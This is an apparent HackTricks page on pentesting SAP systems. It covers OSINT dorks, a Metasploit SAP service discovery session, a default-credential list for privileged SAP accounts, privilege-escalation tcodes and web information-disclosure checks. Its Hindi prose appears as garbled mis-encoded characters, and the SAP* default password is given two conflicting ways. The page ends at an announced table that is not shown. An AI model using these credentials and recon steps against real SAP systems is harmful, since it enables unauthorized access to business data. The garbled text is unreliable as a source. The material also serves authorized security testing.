{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


# SAP рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрд░рд┐рдЪрдп

SAP рдХрд╛ рдорддрд▓рдм рд╕рд┐рд╕реНрдЯрдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рдбреЗрдЯрд╛ рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧ рдореЗрдВ рдЙрддреНрдкрд╛рдж рд╣реИред SAP, рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЗ рдЕрдиреБрд╕рд╛рд░, ERP \(Enterprise Resource Planning\) рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХрд╛ рдирд╛рдо рднреА рд╣реИ рдФрд░ рдХрдВрдкрдиреА рдХрд╛ рдирд╛рдо рднреА рд╣реИред
SAP рдкреНрд░рдгрд╛рд▓реА рдХрдИ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдПрдХреАрдХреГрдд рдореЙрдбреНрдпреВрд▓ рд╕реЗ рдмрдиреА рд╣реЛрддреА рд╣реИ, рдЬреЛ рд╡реНрдпрд╡рд╕рд╛рдп рдкреНрд░рдмрдВрдзрди рдХреЗ рд▓рдЧрднрдЧ рд╣рд░ рдкрд╣рд▓реВ рдХреЛ рдХрд╡рд░ рдХрд░рддреА рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ SAP рдЙрджрд╛рд╣рд░рдг \(рдпрд╛ SID\) рддреАрди рдкрд░рддреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рд╣реЛрддрд╛ рд╣реИ: рдбреЗрдЯрд╛рдмреЗрд╕, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рдкреНрд░реЗрдЬреЗрдВрдЯреЗрд╢рди\), рдкреНрд░рддреНрдпреЗрдХ рд▓реИрдВрдбрд╕реНрдХреЗрдк рдЖрдорддреМрд░ рдкрд░ рдЪрд╛рд░ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ: dev, test, QA рдФрд░ productionред
рдкреНрд░рддреНрдпреЗрдХ рдкрд░рдд рдХреЛ рдХреБрдЫ рд╣рдж рддрдХ рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдкреНрд░рднрд╛рд╡ **рдбреЗрдЯрд╛рдмреЗрд╕ рдкрд░ рд╣рдорд▓реЗ** рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ SAP рдЙрджрд╛рд╣рд░рдг рдХреНрд▓рд╛рдЗрдВрдЯ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рд╣реЛрддрд╛ рд╣реИред рдкреНрд░рддреНрдпреЗрдХ рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ SAP\* рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ "рд░реВрдЯ" рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрддрд╛ рд╣реИред
рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдирд┐рд░реНрдорд╛рдг рдкрд░, рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ SAP\* рдХреЛ рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдорд┐рд▓рддрд╛ рд╣реИ: тАЬ060719992тАЭ \(рдиреАрдЪреЗ рдЕрдзрд┐рдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб\)ред
рдЖрдкрдХреЛ рдЖрд╢реНрдЪрд░реНрдп рд╣реЛрдЧрд╛ рдпрджрд┐ рдЖрдк рдЬрд╛рдирддреЗ рдХрд┐ **рдпреЗ рдкрд╛рд╕рд╡рд░реНрдб рдкрд░реАрдХреНрд╖рдг рдпрд╛ рд╡рд┐рдХрд╛рд╕ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХрд┐рддрдиреА рдмрд╛рд░ рдирд╣реАрдВ рдмрджрд▓реЗ рдЬрд╛рддреЗ рд╣реИрдВ**!

рдХрд┐рд╕реА рднреА рд╕рд░реНрд╡рд░ рдХреЗ рд╢реЗрд▓ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо &lt;SID&gt;adm рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред
рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ рдорджрдж рдХрд░ рд╕рдХрддреА рд╣реИ, рд▓реЗрдХрд┐рди рд╡рд╣рд╛рдБ рдЦрд╛рддрд╛ рд▓реЙрдХрдЖрдЙрдЯ рддрдВрддреНрд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

# рдЦреЛрдЬ

> рдЕрдЧрд▓рд╛ рдЕрдиреБрднрд╛рдЧ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ [https://github.com/shipcod3/mySapAdventures](https://github.com/shipcod3/mySapAdventures) рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ shipcod3 рд╕реЗ рд╣реИ!

* рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдХреЛрдк рдпрд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдмреНрд░реАрдл рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред SAP GUI рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрд╕реНрдЯрдирд╛рдо рдпрд╛ рд╕рд┐рд╕реНрдЯрдо рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХрд╛ рдзреНрдпрд╛рди рд░рдЦреЗрдВред
* OSINT \(open source intelligence\), Shodan рдФрд░ Google Dorks рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдлрд╝рд╛рдЗрд▓реЛрдВ, рдЙрдкрдбреЛрдореЗрди рдФрд░ рд░рд╕рджрд╛рд░ рдЬрд╛рдирдХрд╛рд░реА рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд╕рдХреЗ рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрдВрдЯрд░рдиреЗрдЯ-рдлреЗрд╕рд┐рдВрдЧ рдпрд╛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд╣реИ:
```text
inurl:50000/irj/portal
inurl:IciEventService/IciEventConf
inurl:/wsnavigator/jsps/test.jsp
inurl:/irj/go/km/docs/
https://www.shodan.io/search?query=sap+portal
https://www.shodan.io/search?query=SAP+Netweaver
https://www.shodan.io/search?query=SAP+J2EE+Engine
```
* рдпрд╣рд╛рдБ [http://SAP:50000/irj/portal](http://sap:50000/irj/portal) рдХреИрд╕рд╛ рджрд┐рдЦрддрд╛ рд╣реИ

![SAP рд▓реЙрдЧрд┐рди рд╕реНрдХреНрд░реАрди](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap%20logon.jpeg)

* рдЦреБрд▓реЗ рдкреЛрд░реНрдЯ рдФрд░ рдЬреНрдЮрд╛рдд рд╕реЗрд╡рд╛рдУрдВ (sap рд░рд╛рдЙрдЯрд░реНрд╕, webdnypro, рд╡реЗрдм рд╕реЗрд╡рд╛рдПрдБ, рд╡реЗрдм рд╕рд░реНрд╡рд░, рдЖрджрд┐) рдХреЗ рд▓рд┐рдП nmap рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* рдпрджрд┐ рдХреЛрдИ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ URLs рдХреЛ рдХреНрд░реЙрд▓ рдХрд░реЗрдВред
* рдпрджрд┐ рдпрд╣ рдХреБрдЫ рдкреЛрд░реНрдЯ рдкрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ рд╣реИ рддреЛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдлрдЬрд╝ рдХрд░реЗрдВ (рдЖрдк Burp Intruder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред рдпрд╣рд╛рдБ рдХреБрдЫ рдЕрдЪреНрдЫреЗ рд╡рд░реНрдбрд▓рд┐рд╕реНрдЯ рд╣реИрдВ рдЬреЛ SecLists рдкреНрд░реЛрдЬреЗрдХреНрдЯ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╣реИрдВ, рдЬреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ SAP ICM рдкрде рдФрд░ рдЕрдиреНрдп рджрд┐рд▓рдЪрд╕реНрдк рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдпрд╛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИрдВ:

[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls\_SAP.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-SAP.txt)  
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt)  
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt)

* SAP INSTANCE/SERVICE/COMPONENT рдХреА рдЧрдгрдирд╛ рдХреЗ рд▓рд┐рдП SAP SERVICE DISCOVERY рд╕рд╣рд╛рдпрдХ Metasploit рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```text
msf > use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > show options
Module options (auxiliary/scanner/sap/sap_service_discovery):
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-01            yes       Instance numbers to scan (e.g. 00-05,00-99)
RHOSTS                        yes       The target address range or CIDR identifier
THREADS      1                yes       The number of concurrent threads
TIMEOUT      1000             yes       The socket connect timeout in milliseconds
msf auxiliary(sap_service_discovery) > set rhosts 192.168.96.101
rhosts => 192.168.96.101
msf auxiliary(sap_service_discovery) > run
[*] 192.168.96.101:       - [SAP] Beginning service Discovery '192.168.96.101'
```
## Testing the Thick Client / SAP GUI

рдпрд╣рд╛рдБ SAP GUI рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб рд╣реИ  
`sapgui <sap server hostname> <system number>`

* рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд▓рд┐рдП рдЬрд╛рдБрдЪ рдХрд░реЗрдВ \(In BugcrowdтАЩs Vulnerability Rating Taxonomy, this is considered as P1 -&gt; Server Security Misconfiguration \| Using Default Credentials \| Production Server\):
```text
# SAP* - High privileges - Hardcoded kernel user
SAP*:06071992:*
SAP*:PASS:*
# IDEADM - High Privileges - Only in IDES systems
IDEADM:admin:*
# DDIC - High privileges - User has SAP_ALL
DDIC:19920706:000,001
# EARLYWATCH - High privileges
EARLYWATCH:SUPPORT:066
# TMSADM - Medium privileges
TMSADM:PASSWORD:000
TMSADM:$1Pawd2&:000
# SAPCPIC - Medium privileges
SAPCPIC:ADMIN:000,001
# SOLMAN dialog default users and passwords.
# For more info check:
# https://www.troopers.de/media/filer_public/37/34/3734ebb3-989c-4750-9d48-ea478674991a/an_easy_way_into_your_sap_systems_v30.pdf
# https://launchpad.support.sap.com/#/notes/2293011
# SOLMAN_ADMIN - High privileges - Only on SOLMAN systems
SOLMAN_ADMIN:init1234:*
# SAPSUPPORT - High privileges - Only on SOLMAN or satellite systems
SAPSUPPORT:init1234:*
# SOLMAN<SID><CLNT> - High privileges - Only on SOLMAN systems
#SOLMAN<SID><CLNT>:init1234:*
# Trial systems
# -------------
# AS ABAP 7.40 SP08 Developer Edition:
# https://blogs.sap.com/2015/10/14/sap-netweaver-as-abap-740-sp8-developer-edition-to-download-consise-installation-instruction/
DDIC:DidNPLpw2014:001
SAP*:DidNPLpw2014:001
DEVELOPER:abCd1234:001
BWDEVELOPER:abCd1234:001
# AS ABAP 7.50 SP02 Developer Edition:
# https://blogs.sap.com/2016/11/03/sap-nw-as-abap-7.50-sp2-developer-edition-to-download-consise-installation-guide/
# AS ABAP 7.51 SP02 Developer Edition:
# https://blogs.sap.com/2017/09/04/sap-as-abap-7.51-sp2-developer-edition-to-download-concise-installation-guide/
DDIC:Appl1ance:000,001
SAP*:Appl1ance:000,001
DEVELOPER:Appl1ance:001
BWDEVELOPER:Appl1ance:001
# AS ABAP 7.51 SP01 Developer Edition:
# https://blogs.sap.com/2018/09/13/as-abap-7.52-sp01-developer-edition-concise-installation-guide/
# AS ABAP 7.52 SP04 Developer Edition:
# https://blogs.sap.com/2019/10/01/as-abap-7.52-sp04-developer-edition-concise-installation-guide/
DDIC:Down1oad:000,001
SAP*:Down1oad:000,001
DEVELOPER:Down1oad:001
BWDEVELOPER:Down1oad:001
```
* Wireshark рдЪрд▓рд╛рдПрдБ рдлрд┐рд░ рдХреНрд▓рд╛рдЗрдВрдЯ \(SAP GUI\) рдореЗрдВ рдЙрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░реЗрдВ рдЬреЛ рдЖрдкрдиреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рдХреНрд▓рд╛рдЗрдВрдЯ SSL рдХреЗ рдмрд┐рдирд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рднреЗрдЬрддреЗ рд╣реИрдВред Wireshark рдХреЗ рд▓рд┐рдП рджреЛ рдЬреНрдЮрд╛рдд рдкреНрд▓рдЧрдЗрди рд╣реИрдВ рдЬреЛ SAP DIAG рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдореБрдЦреНрдп рд╣реЗрдбрд░ рдХреЛ рднреА рд╡рд┐рдШрдЯрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: SecureAuth Labs SAP рд╡рд┐рдШрдЯрди рдкреНрд▓рдЧ-рдЗрди рдФрд░ Positive Research Center рджреНрд╡рд╛рд░рд╛ SAP DIAG рдкреНрд▓рдЧрдЗрдиред
* рдирд┐рдореНрди-privilege рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХреБрдЫ SAP рдЯреНрд░рд╛рдВрдЬреИрдХреНрд╢рди рдХреЛрдб \(tcodes\) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
* SU01 - рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдмрдирд╛рдиреЗ рдФрд░ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП
* SU01D - рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП
* SU10 - рд╕рд╛рдореВрд╣рд┐рдХ рд░рдЦрд░рдЦрд╛рд╡ рдХреЗ рд▓рд┐рдП
* SU02 - рдкреНрд░реЛрдлрд╛рдЗрд▓ рдХреЗ рдореИрдиреБрдЕрд▓ рдирд┐рд░реНрдорд╛рдг рдХреЗ рд▓рд┐рдП
* SM19 - рд╕реБрд░рдХреНрд╖рд╛ рдСрдбрд┐рдЯ - рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди
* SE84 - SAP R/3 рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЗ рд▓рд┐рдП рд╕реВрдЪрдирд╛ рдкреНрд░рдгрд╛рд▓реА
* рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдореЗрдВ рд╕рд┐рд╕реНрдЯрдо рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ / рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред
* рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк BAPI Explorer рдкрд░ XSS рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

# рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕ рдХрд╛ рдкрд░реАрдХреНрд╖рдг

* URLs рдХреЛ рдХреНрд░реЙрд▓ рдХрд░реЗрдВ \(рджреЗрдЦреЗрдВ рдЦреЛрдЬ рдЪрд░рдг\)ред
* рдЦреЛрдЬ рдЪрд░рдг рдореЗрдВ URLs рдХреЛ рдлрдЬрд╝ рдХрд░реЗрдВред рдпрд╣рд╛рдБ [http://SAP:50000/index.html](http://sap:50000/index.html) рдХреИрд╕рд╛ рджрд┐рдЦрддрд╛ рд╣реИ:

![SAP Index Page](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/index.jpeg)

* рд╕рд╛рдорд╛рдиреНрдп рд╡реЗрдм рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ \(OWASP Top 10 рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░реЗрдВ\) рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рд╕реНрдерд╛рдиреЛрдВ рдкрд░ XSS, RCE, XXE, рдЖрджрд┐ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рд╣реИрдВред
* рд╡реЗрдм рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Jason Haddix рдХрд╛ [тАЬThe Bug Hunters MethodologyтАЭ](https://github.com/jhaddix/tbhm) рджреЗрдЦреЗрдВред
* рдХреНрдпрд╛ рд╡рд░реНрдм рдЯреЗрдореНрдкрд░рд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдпрдкрд╛рд╕ рд╕рдВрднрд╡ рд╣реИ? рд╢рд╛рдпрдж :\)
* `http://SAP:50000/webdynpro/resources/sap.com/XXX/JWFTestAddAssignees#` рдЦреЛрд▓реЗрдВ рдлрд┐рд░ тАЬChooseтАЭ рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ рдЦреБрд▓реЗ рд╣реБрдП рд╡рд┐рдВрдбреЛ рдореЗрдВ тАЬSearchтАЭ рджрдмрд╛рдПрдБред рдЖрдкрдХреЛ SAP рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдПрдХ рд╕реВрдЪреА рджреЗрдЦрдиреА рдЪрд╛рд╣рд┐рдП \(рдХрдордЬреЛрд░реА рд╕рдВрджрд░реНрдн: [ERPSCAN-16-010](https://erpscan.com/advisories/erpscan-16-010-sap-netweaver-7-4-information-disclosure/) \)
* рдХреНрдпрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ HTTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдП рдЧрдП рд╣реИрдВ? рдпрджрд┐ рд╣рд╛рдБ, рддреЛ рдЗрд╕реЗ Bugcrowd рдХреЗ [Vulnerability Rating Taxonomy](https://bugcrowd.com/vulnerability-rating-taxonomy) рдХреЗ рдЖрдзрд╛рд░ рдкрд░ P3 рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ: рдЯреВрдЯреА рд╣реБрдИ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рд╕рддреНрд░ рдкреНрд░рдмрдВрдзрди \| HTTP рдкрд░ рдХрдордЬреЛрд░ рд▓реЙрдЧрд┐рди рдлрд╝рдВрдХреНрд╢рдиред рд╕рдВрдХреЗрдд: [http://SAP:50000/startPage](http://sap:50000/startPage) рдпрд╛ рд▓реЙрдЧрд┐рди рдкреЛрд░реНрдЯрд▓реНрд╕ рдХреА рднреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ :\)

![SAP Start Page](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/startPage.jpeg)

* рд╕рдВрднрд╛рд╡рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реВрдЪреАрдХрд░рдг рдпрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рд▓рд┐рдП `/irj/go/km/navigation/` рдЖрдЬрд╝рдорд╛рдПрдБ
* [http://SAP/sap/public/info](http://sap/sap/public/info) рдХреБрдЫ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬрд╛рдирдХрд╛рд░реА рд░рдЦрддрд╛ рд╣реИ:
```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
<SOAP-ENV:Body>
<rfc:RFC_SYSTEM_INFO.Response xmlns:rfc="urn:sap-com:document:sap:rfc:functions">
<RFCSI>
<RFCPROTO>011</RFCPROTO>
<RFCCHARTYP>4102</RFCCHARTYP>
<RFCINTTYP>BIG</RFCINTTYP>
<RFCFLOTYP>IE3</RFCFLOTYP>
<RFCDEST>randomnum</RFCDEST>
<RFCHOST>randomnum</RFCHOST>
<RFCSYSID>BRQ</RFCSYSID>
<RFCDATABS>BRQ</RFCDATABS>
<RFCDBHOST>randomnum</RFCDBHOST>
<RFCDBSYS>ORACLE</RFCDBSYS>
<RFCSAPRL>740</RFCSAPRL>
<RFCMACH>324</RFCMACH>
<RFCOPSYS>AIX</RFCOPSYS>
<RFCTZONE>-25200</RFCTZONE>
<RFCDAYST/>
<RFCIPADDR>192.168.1.8</RFCIPADDR>
<RFCKERNRL>749</RFCKERNRL>
<RFCHOST2>randomnum</RFCHOST2>
<RFCSI_RESV/>
<RFCIPV6ADDR>192.168.1.8</RFCIPV6ADDR>
</RFCSI>
</rfc:RFC_SYSTEM_INFO.Response>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
# Configuration Parameters

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ pentest рдХреЗ рджреМрд░рд╛рди рд╕рд╣реА рд▓реЙрдЧрд┐рди рд╡рд┐рд╡рд░рдг рд╣реИрдВ рдпрд╛ рдЖрдкрдиреЗ рдмреБрдирд┐рдпрд╛рджреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SAP GUI рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХреА рд╣реИ, рддреЛ рдЖрдк рдкреИрд░рд╛рдореАрдЯрд░ рдорд╛рдиреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдХрдИ рдмреБрдирд┐рдпрд╛рджреА рдФрд░ рдХрд╕реНрдЯрдо рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреИрд░рд╛рдореАрдЯрд░ рдорд╛рдиреЛрдВ рдХреЛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЖрдк рдореИрдиреНрдпреБрдЕрд▓ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рджреЛрдиреЛрдВ рддрд░реАрдХреЛрдВ рд╕реЗ рдкреИрд░рд╛рдореАрдЯрд░ рдорд╛рдиреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ (рдЬреИрд╕реЗ [SAP Parameter Validator](https://github.com/damianStrojek/SAPPV))ред

## Manual Parameter Checking

рд▓реЗрдирджреЗрди рдХреЛрдб `RSPFPAR` рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдХреЗ, рдЖрдк рд╡рд┐рднрд┐рдиреНрди рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдХреНрд╡реЗрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдирдХреЗ рдорд╛рди рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдиреАрдЪреЗ рджреА рдЧрдИ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдФрд░ рдЙрдирдХреЗ рд▓рд┐рдП рднрд┐рдиреНрдирддрд╛ рдХреА рд╢рд░реНрддреЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

